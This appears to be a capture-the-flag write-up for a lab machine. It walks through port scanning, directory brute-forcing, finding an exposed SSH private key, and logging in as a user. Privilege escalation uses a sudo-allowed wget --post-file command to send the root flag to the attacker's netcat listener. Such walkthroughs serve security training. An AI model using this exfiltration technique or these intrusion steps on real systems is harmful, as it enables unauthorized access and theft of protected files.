

IP= 10.10.124.163

### Enumeration

```
$ nmap -p- -T5 10.10.124.163
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-01 19:53 EST
Warning: 10.10.124.163 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.124.163
Host is up (0.17s latency).
Not shown: 65120 closed tcp ports (conn-refused), 413 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 876.28 seconds
```

```
$ dirb http://10.10.124.163/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jan  1 20:58:41 2023
URL_BASE: http://10.10.124.163/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.124.163/ ----
+ http://10.10.124.163/index.html (CODE:200|SIZE:11374)                                                              
+ http://10.10.124.163/server-status (CODE:403|SIZE:278)                                                             
==> DIRECTORY: http://10.10.124.163/sitemap/ 

Entering directory: http://10.10.124.163/sitemap/ ----
==> DIRECTORY: http://10.10.124.163/sitemap/.ssh/

```
- Site contains developement team information (potential users for ssh login)
- RSA ID found in /.ssh directory discovered with dirb

```
$ chmod 600 id_rsa
```

```
$ searchsploit OpenSSH
...
OpenSSH 7.2p2 - Username Enumeration
```

- Attempted to enumerate a list of usernames via Metasploit module and custom wordlist of discovered devs, but produced a bunch of false positives, so it is back to enumeration.

- Discovered JS comment in source page of default apache page that could be used as a username:

" <!- Jessie don't forget to udate the webiste --> "

--------------------------------------------------

```bash
$ ssh -i id_rsa  jessie@10.10.239.158

Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$ ls
Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos
...
jessie@CorpOne:~$ cd Documents
jessie@CorpOne:~/Documents$ ls
user_flag.txt
jessie@CorpOne:~/Documents$ cat user_flag.txt
[REDACTED]
```

### Privilege Escalation

- User has unrestricted access as far as sudo permissions go, but
we can see that the user has perms to use wget as root without a password. 

"wget is a utility for non-interactive download of files from the Web. It supports HTTP, HTTPS, and FTP protocols, as well as retrieval through HTTP proxies."

```
jessie@CorpOne:~$ cd /
jessie@CorpOne:/$ ls
bin  boot  cdrom  dev  etc  home  initrd.img  initrd.img.old  lib  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz
jessie@CorpOne:/$ cd root
-bash: cd: root: Permission denied
jessie@CorpOne:/$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

```
Victim Machine:

jessie@CorpOne:/$ sudo wget --post-file=root/root_flag.txt 10.2.1.180:4444
--2023-01-04 05:57:38--  http://10.2.1.180:4444/
Connecting to 10.2.1.180:4444... connected.
HTTP request sent, awaiting response... 

Local Machine:

$ nc -lvnp 444

listening on [any] 4444 ...
connect to [10.2.1.180] from (UNKNOWN) [10.10.239.158] 36248
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.2.1.180:4444
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

[REDACTED]
```
